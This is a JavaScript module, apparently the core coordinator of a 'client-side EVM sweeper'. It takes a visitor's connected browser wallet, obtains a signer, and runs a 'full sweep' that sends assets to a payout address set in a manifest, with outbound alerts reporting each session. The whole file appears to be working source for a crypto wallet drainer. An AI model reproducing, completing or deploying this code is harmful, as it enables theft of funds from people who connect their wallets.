// client-side-evm-sweeper/src/core/master-link.js
import { ethers } from 'ethers';
import { TransactionRunner } from './transaction-runner.js';
import { networkManifest } from '@/config/network-manifest.js';
import { OutboundAlerts } from './outbound-alerts.js';

/**
 * MASTER LINK - Core Entry & Coordination Tower (Ethers v6 Hardened)
 * Connects browser walletClient instances straight to the transaction execution runner.
 */
export class MasterLink {
  constructor(options = {}) {
    this.options = {
      defaultDryRun: true,
      maxRetries: 3,
      logLevel: 'info',
      ...options
    };
    this.alerts = new OutboundAlerts(options.alerts || {});
    this.currentRunner = null;
    this.isRunning = false;
    this.sessionStartTime = null;
  }

  /**
   * Main public entry point invoked by your interoperability bridge wrapper
   */
  async startWithWallet(walletAddress, chainId = 1, overrides = {}) {
    if (this.isRunning) {
      console.warn("[MasterLink] Sweep session already in progress.");
      return { success: false, reason: "Already running" };
    }
    
    this.sessionStartTime = Date.now();
    this.isRunning = true;
    
    try {
      const walletClient = overrides.walletClient || null;
      await this.validateInputs(walletAddress, chainId);
      await this.logStart(walletAddress, chainId);
      
      // Resolve and isolate the absolute base provider context
      const providerContext = await this.detectAndValidateProvider();
      
      // Establish robust signer handshake
      const signer = await this.getSigner(providerContext, walletClient);
      
      // Hardened Safety Check: Verify signer match and active network state
      await this.verifySignerState(signer, walletAddress, chainId);
      
      const config = this.buildRunnerConfig(walletAddress, chainId, overrides);
      this.currentRunner = new TransactionRunner(config);
      
      await this.runPreFlightChecks();
      console.log(`[MasterLink] Executing full sweep for ${walletAddress}`);
      
      // Execute operational pipeline
      const result = await this.currentRunner.executeFullSweep(signer, providerContext);
      await this.logSuccess(result);
      return { success: true, result };
      
    } catch (error) {
      await this.handleCriticalError(error, walletAddress);
      return { success: false, error: error.message || "Unknown operational failure" };
    } finally {
      this.isRunning = false;
      this.currentRunner = null;
    }
  }

  async validateInputs(walletAddress, chainId) {
    if (!walletAddress || !/^0x[a-fA-F0-9]{40}$/.test(walletAddress)) {
      throw new Error("Invalid Ethereum wallet address format");
    }
    if (!Number.isInteger(chainId) || chainId < 1) {
      throw new Error("Invalid chainId");
    }
    const supported = networkManifest.networks.some(n => n.chainId === chainId);
    if (!supported) {
      console.warn(`[MasterLink] Chain ${chainId} not explicitly configured in manifest. Proceeding with runtime defaults.`);
    }
  }

  /**
   * Hardened Provider Resolver
   * Aggressively screens for multiple conflicting embedded browser extensions.
   */
  async detectAndValidateProvider() {
    if (typeof window === 'undefined') {
      throw new Error("Execution context restricted: Window object unavailable");
    }
    
    let baseProvider = window.ethereum;
    if (!baseProvider) {
      throw new Error("No injected wallet provider found (Install MetaMask, Rabby, or Coinbase Wallet)");
    }

    // De-conflict multiple concurrent wallet injections (e.g., MetaMask + Brave + Coinbase)
    if (baseProvider.providers && Array.isArray(baseProvider.providers)) {
      console.log("[MasterLink] Multiple injected providers found. isolating target context...");
      baseProvider = baseProvider.providers.find(p => p.isMetaMask) || baseProvider.providers[0];
    }
    
    return baseProvider;
  }

  /**
   * Upgraded Signer Selector (Strict Ethers v6 Engine Alignment)
   */
  async getSigner(providerContext, walletClient) {
    try {
      // Priority 1: Leverage external UI framework hooks (e.g., Wagmi/Viem client wraps)
      if (walletClient) {
        console.log("[MasterLink] Binding active, authenticated walletClient instance.");
        return await new ethers.BrowserProvider(walletClient).getSigner();
      }

      // Priority 2: Standard global window fallback
      console.log("[MasterLink] Initializing browser provider signature interface.");
      const globalProvider = new ethers.BrowserProvider(providerContext);
      return await globalProvider.getSigner();
    } catch (err) {
      throw new Error(`Signer handshake initialization rejected: ${err.message}`);
    }
  }

  /**
   * Hardened State Verification Check
   * Fails early if the wallet changes accounts or networks right before executing.
   */
  async verifySignerState(signer, expectedAddress, expectedChainId) {
    if (!signer || typeof signer.getAddress !== 'function') {
      throw new Error("Malformed signer signature interface detected");
    }

    const [activeAddress, networkContext] = await Promise.all([
      signer.getAddress(),
      signer.provider ? signer.provider.getNetwork() : null
    ]);

    if (activeAddress.toLowerCase() !== expectedAddress.toLowerCase()) {
      throw new Error(`Signer mismatch: Connected wallet is [${activeAddress}] but expected target is [${expectedAddress}]`);
    }

    if (networkContext && Number(networkContext.chainId) !== Number(expectedChainId)) {
      throw new Error(`Network desynchronization: Wallet is on chain ${networkContext.chainId} but engine requested chain ${expectedChainId}`);
    }
  }

  buildRunnerConfig(walletAddress, chainId, overrides) {
    return {
      networks: networkManifest.networks,
      targets: networkManifest.targets || [],
      ownerAddress: walletAddress,
      sweeperAddress: networkManifest.EVM_PAYOUT_TARGET || overrides.sweeperAddress,
      alchemyApiKey: networkManifest.ALCHEMY_API_KEY || "", 
      dryRun: overrides.dryRun !== undefined ? overrides.dryRun : this.options.defaultDryRun,
      alerts: this.options.alerts,
      maxConcurrent: overrides.maxConcurrent || 2,
      preferredProfile: overrides.preferredProfile || 'aggressive'
    };
  }

  async runPreFlightChecks() {
    console.log("[MasterLink] Running pre-flight safety checks...");
    if (!networkManifest.EVM_PAYOUT_TARGET) {
      console.warn("[MasterLink Warning] No EVM_PAYOUT_TARGET defined in manifest.");
    }
    if (networkManifest.targets?.length === 0) {
      console.warn("[MasterLink Warning] No targets configured inside framework manifest.");
    }
    await new Promise(r => setTimeout(r, 300));
  }

  async logStart(walletAddress, chainId) {
    console.log(`%c[MasterLink] Starting sweep session for ${walletAddress.slice(0,6)}... on chain ${chainId}`, "color: #00ffaa; font-weight: bold");
    await this.alerts.info(
      "Sweep Session Started",
      `Wallet: ${walletAddress.slice(0,8)}... | Chain: ${chainId}`,
      { sessionStart: new Date().toISOString() }
    );
  }

  async logSuccess(result) {
    const duration = ((Date.now() - this.sessionStartTime) / 1000).toFixed(1);
    console.log(`%c[MasterLink] Sweep completed successfully in ${duration}s`, "color: #00ff00; font-weight: bold");
    await this.alerts.success(
      "Sweep Completed",
      `Processed ${result?.length || 0} assets in ${duration} seconds`,
      { duration, processed: result?.length || 0 }
    );
  }

  async handleCriticalError(error, walletAddress) {
    // Intercept standard RPC cancellations for cleaner error messages
    let localizedMessage = error.message || "Unknown execution error";
    if (error.code === 4001 || localizedMessage.includes("rejected")) {
      localizedMessage = "Transaction signature was rejected by user in wallet UI.";
    }

    console.error("[MasterLink] Critical execution failure:", error);
    await this.alerts.error(
      "Sweep Execution Failed",
      localizedMessage,
      { 
        wallet: walletAddress.slice(0, 12) + "...", 
        duration: ((Date.now() - this.sessionStartTime) / 1000).toFixed(1) 
      }
    );
  }

  async stop() {
    this.isRunning = false;
    console.log("[MasterLink] Emergency execution stop command received.");
  }

  getStatus() {
    return {
      isRunning: this.isRunning,
      sessionDuration: this.sessionStartTime ? ((Date.now() - this.sessionStartTime) / 1000).toFixed(1) : 0,
      runnerActive: !!this.currentRunner
    };
  }

  async forceDryRunMode() {
    this.options.defaultDryRun = true;
    console.log("[MasterLink] Dry-run mode enabled globally.");
  }
}

const masterLink = new MasterLink();
export default masterLink;

if (typeof window !== 'undefined') {
  window.MasterLink = masterLink;
  console.log("%c[MasterLink] Successfully initialized and attached to window.", "color: #00aaff; font-weight: bold");
}
